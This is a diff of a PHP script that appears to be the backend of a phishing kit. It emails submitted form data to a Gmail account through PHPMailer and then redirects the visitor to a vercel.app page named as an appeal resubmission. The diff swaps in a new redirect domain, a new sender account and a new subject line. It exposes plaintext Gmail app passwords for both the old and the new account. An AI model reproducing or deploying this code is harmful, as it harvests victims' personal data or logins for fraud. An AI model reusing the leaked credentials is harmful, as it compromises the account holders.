@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://re-again-apply.vercel.app/");
+header("Location: https://re-submit-your-appeal.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -27,8 +27,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $mail->isSMTP();
         $mail->Host       = 'smtp.gmail.com'; // Replace with your SMTP server address
         $mail->SMTPAuth   = true;
-        $mail->Username   = 'patjckbang@gmail.com'; // Replace with your email address
-        $mail->Password   = 'wqvv rhzu ydia haut'; // Replace with your email password
+        $mail->Username   = 'official.mitchealmartin@gmail.com'; // Replace with your email address
+        $mail->Password   = 'stbi hwua bspu vgiv'; // Replace with your email password
         $mail->SMTPSecure = 'tls';
         $mail->Port       = 587;
 
@@ -43,7 +43,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'MUKHTIYAR';
+        $mail->Subject = 'Rajesh Parmar';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
